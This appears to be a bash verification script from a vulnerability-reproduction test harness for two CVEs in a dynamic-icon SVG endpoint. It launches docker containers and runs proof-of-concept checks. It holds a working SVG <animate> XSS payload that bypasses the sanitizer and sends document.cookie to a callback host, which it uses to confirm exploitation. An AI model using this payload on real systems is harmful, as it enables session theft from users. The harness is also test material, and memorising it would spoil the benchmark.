#!/usr/bin/env bash
# verify.sh --seed|--residual
# seed     : CVE-2026-29183 static <a href="javascript:..."> (original_poc.py)
# residual : CVE-2026-31807 animate SMIL (inline; NOT CR-in-scheme / NOT original_poc --residual)
# Effect = callback /dump contains the CURRENT RUN_FLAG (victim cookie exfil).
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"

if [[ -f "$WORK_DIR/compose.env" ]]; then
  set -a
  # shellcheck disable=SC1091
  source "$WORK_DIR/compose.env"
  set +a
fi

_cport() {
  docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" \
    --profile "$VERSION" port "$1" "$2" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]'
}

PORT="$(_cport "$VERSION" 6806)"
VPORT="$(_cport victim 8070)"
CPORT2="$(_cport callback 9000)"
if [[ -z "$PORT" || -z "$VPORT" || -z "$CPORT2" ]]; then
  echo "verify: compose port failed (need --profile $VERSION) app=$PORT victim=$VPORT cb=$CPORT2" >&2
  exit 20
fi
export PCB_TARGET_PORT="$PORT" PCB_VICTIM_PORT="$VPORT" PCB_CALLBACK_PORT="$CPORT2"
export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"

READY=0
for _ in $(seq 1 60); do
  acode="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 \
    "http://127.0.0.1:${PORT}/api/icon/getDynamicIcon?type=8&content=ok" || true)"
  vhealth="$(curl -sS --max-time 5 "http://127.0.0.1:${VPORT}/health" || true)"
  chealth="$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 "http://127.0.0.1:${CPORT2}/health" || true)"
  if [[ "$acode" == "200" && "$vhealth" == "ok" && "$chealth" == "200" ]]; then
    READY=1
    break
  fi
  sleep 3
done
[[ "$READY" == 1 ]] || { echo "verify: env not ready app=$PORT victim=$VPORT cb=$CPORT2" >&2; exit 20; }

if [[ "$MODE" == "--seed" ]]; then
  CAND="$("$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" 2>/dev/null || true)"
  CAND="${CAND:-"{}"}"
  CAND="$("$PY" -c "import json,sys
s = sys.argv[1]
try:
    json.loads(s)
    print(s)
except Exception:
    print(json.dumps({'path': s.strip(), 'to': s.strip(), 'payload': s.strip(), 'css': s.strip()}))" "$CAND")"
  printf '%s' "$CAND" > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
  echo "${OUT:0:500}"
  if grep -qF -- "$RUN_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
fi

# residual: GHSA-5hc8 Vector 1 — <animate> writes href at t=0. V1 SanitizeSVG does not
# delete animate; static javascript: href prefix check never sees values=. Inline literal
# (do not call original_poc.py --residual; that file is seed-only).
"$PY" - "$VERSION" > "$WORK_DIR/cand.json" <<'PYEOF'
import json, sys, urllib.parse
v = sys.argv[1]
base = {"v0": "http://v0:6806", "v1": "http://v1:6806", "v2": "http://v2:6806"}.get(v, "http://v1:6806")
payload = (
    "</text><a><animate attributeName=\"href\" "
    "values=\"javascript:location='http://callback:9000/c?f='+document.cookie\" "
    "begin=\"0s\" fill=\"freeze\"/>"
    "<text x=\"256\" y=\"256\" font-size=\"60\">c</text></a><text>"
)
print(json.dumps({
    "target": base + "/api/icon/getDynamicIcon?type=8&color=blue&content=" + urllib.parse.quote(payload, safe=""),
    "origin": base,
}))
PYEOF
OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
echo "${OUT:0:500}"
if grep -qF -- "$RUN_FLAG" <<<"$OUT"; then exit 0; else exit 10; fi
